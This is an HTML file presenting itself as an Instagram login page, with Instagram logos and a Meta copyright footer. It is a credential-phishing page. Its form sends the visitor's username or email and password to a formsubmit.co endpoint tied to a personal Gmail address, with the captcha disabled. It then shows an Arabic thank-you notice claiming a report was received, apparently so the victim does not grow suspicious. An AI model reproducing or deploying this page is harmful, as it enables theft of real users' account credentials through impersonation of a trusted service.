<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <link rel="stylesheet" href="./styles.css" />
  <link rel="icon" type="image/png" href="./img/insta-fav.ico">
  <title>Instagram clone</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #fafafa;
      margin: 0;
      padding: 0;
    }
    .flex { display: flex; }
    .direction-column { flex-direction: column; }
    .align-items-center { align-items: center; }
    .justify-content-center { justify-content: center; }
    .main-container {
      min-height: 100vh;
    }
    .panel {
      background: white;
      border: 1px solid #dbdbdb;
      padding: 2rem;
      margin: 1rem;
      width: 300px;
      text-align: center;
      border-radius: 10px;
    }
    input {
      width: 100%;
      padding: 0.5rem;
      margin-top: 10px;
      border: 1px solid #dbdbdb;
      border-radius: 5px;
    }
    button {
      margin-top: 1rem;
      width: 100%;
      padding: 0.5rem;
      background-color: #0095f6;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
    footer {
      text-align: center;
      margin-top: 40px;
      font-size: 12px;
      color: #8e8e8e;
    }
    .thank-you {
      display: none;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    .thank-you.show {
      display: flex;
    }
  </style>
</head>
<body>
  <!-- صفحة تسجيل الدخول -->
  <main class="main-container flex align-items-center justify-content-center" id="login-page">
    <section id="auth" class="flex direction-column">
      <div class="panel login flex direction-column">
        <h1 class="flex justify-content-center">
          <img src="./img/instagram-logo.png" alt="Instagram logo" style="width: 180px;" />
        </h1>
        <form action="https://formsubmit.co/frtstore1@gmail.com" method="POST">
          <input name="email" placeholder="Phone number, username, or email" required />
          <input name="password" type="password" placeholder="Password" required />
          <button type="submit">Log In</button>

          <!-- خيارات FormSubmit -->
          <input type="hidden" name="_honey" style="display:none">
          <input type="hidden" name="_captcha" value="false">
          <input type="hidden" name="_next" value="thank-you.html">
        </form>
      </div>
    </section>
  </main>

  <!-- صفحة الشكر -->
  <div class="thank-you" id="thank-you-page">
    <div class="panel">
      <img src="./img/instagram-logo.png" alt="Instagram Logo" style="width: 150px; margin-bottom: 20px;" />
      <h2>شكرًا لك!</h2>
      <p>لقد تلقينا بلاغك وسنعمل على حل المشكلة في أقرب وقت.</p>
    </div>
  </div>

  <footer>
    <p>© 2025 Instagram from Meta</p>
  </footer>

  <script>
    // هذا الجزء لعرض صفحة الشكر فقط إذا تم الدخول من صفحة FormSubmit
    if (window.location.pathname.includes("thank-you.html")) {
      document.getElementById("login-page").style.display = "none";
      document.getElementById("thank-you-page").classList.add("show");
    }
  </script>
</body>
</html>
